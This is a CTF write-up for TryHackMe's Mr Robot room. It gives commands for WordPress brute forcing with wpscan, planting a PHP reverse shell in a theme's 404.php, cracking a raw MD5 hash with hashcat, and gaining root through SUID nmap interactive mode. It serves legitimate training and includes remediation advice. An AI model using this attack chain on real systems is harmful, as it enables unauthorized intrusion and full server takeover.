# Mr Robot CTF — TryHackMe Writeup

> **Room:** [Mr Robot CTF](https://tryhackme.com/room/mrrobot) · **Difficulty:** Medium
> **Category:** Web / WordPress (brute → theme shell → SUID nmap)
> **Author of writeup:** 0xnyx
> **Goal:** Find three keys — foothold through WordPress, pivot via a crackable hash, root via SUID nmap.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/mrrobot), **no keys, passwords, or cracked values are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**. Three keys = three layers.

---

## Step 1 — Recon (robots.txt gift)

**Do** — Scan and check robots.txt.

```bash
nmap -sVC -T4 -Pn <TARGET>
curl -s http://<TARGET>/robots.txt
```

**You get**

```
80/443 http (WordPress - "...user's Blog!")
robots.txt →
  key-1-of-3.txt
  fsocity.dic        <- a large wordlist
```

**Why / what next** — `key-1-of-3.txt` is **key 1**, straight off robots.txt. `fsocity.dic` is clearly the intended brute-force wordlist. The site is WordPress → go for `/wp-login.php`.

---

## Step 2 — Foothold (WordPress brute → theme shell)

**Do** — WordPress tells you when a *username* is valid (different error text), so enumerate first, then brute the password. `fsocity.dic` has huge duplication — dedupe it.

```bash
sort -u fsocity.dic -o fsocity.uniq
wpscan --url http://<TARGET> -U elliot -P fsocity.uniq
```

**You get** — Valid admin login for **elliot**.

**Why / what next** — WordPress admin = code execution via the **Theme Editor**. Edit an inactive theme's `404.php` (Twenty Fifteen) to a PHP reverse shell, then request it:

```bash
# Appearance → Editor → 404.php → paste reverse shell (nc -lvnp 4444 first)
curl http://<TARGET>/wp-content/themes/twentyfifteen/404.php
```

**You get** — A reverse shell as **daemon**. In the web root: **key 1** again + `wp-config.php` holding the **MySQL DB credentials**.

**Why / what next** — Look for the next user. There's a `robot` home dir.

---

## Step 3 — Pivot to robot (crack the MD5)

**Do** — Read robot's home.

```bash
ls -la /home/robot
cat /home/robot/password.raw-md5
```

**You get** — `key-2-of-3.txt` (no read perm yet) and a **world-readable `password.raw-md5`** = `robot:<md5hash>`.

**Why / what next** — Crack the raw MD5 offline, then `su` to robot:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
su robot      # use the cracked password
```

**You get** — robot's shell → **key 2**.

---

## Step 4 — Root (SUID nmap)

**Do** — SUID sweep.

```bash
find / -perm -4000 -type f 2>/dev/null
```

**You get**

```
/usr/local/bin/nmap
```

**Why / what next** — This is an **old nmap with interactive mode**, which runs shell commands as the file owner (root) ([GTFOBins: nmap/suid](https://gtfobins.github.io/gtfobins/nmap/#suid)):

```bash
nmap --interactive
nmap> !sh
```

**You get** — A root shell → **key 3**.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | robots.txt | Key 1 + fsocity.dic wordlist |
| 2 | wpscan brute → 404.php theme shell | daemon shell + DB creds |
| 3 | Crack `password.raw-md5` → `su robot` | Key 2 |
| 4 | SUID nmap `--interactive` `!sh` | Root (Key 3) |

## Lessons

- Always dedupe a provided wordlist (`sort -u`) — fsocity.dic is mostly duplicates.
- WordPress admin → RCE via the **Theme Editor** (edit `404.php` of an unused theme).
- A **world-readable hash file** is a free pivot; crack with hashcat `-m 0` (raw MD5).
- **SUID nmap** (legacy) → interactive mode `!sh` = root.

## Remediation

- Remove sensitive files from the web root and robots.txt.
- Enforce strong WP passwords + disable the file editor (`DISALLOW_FILE_EDIT`).
- Never leave hashes world-readable; never set SUID on nmap.

---

*Write-up for [TryHackMe — Mr Robot CTF](https://tryhackme.com/room/mrrobot).*
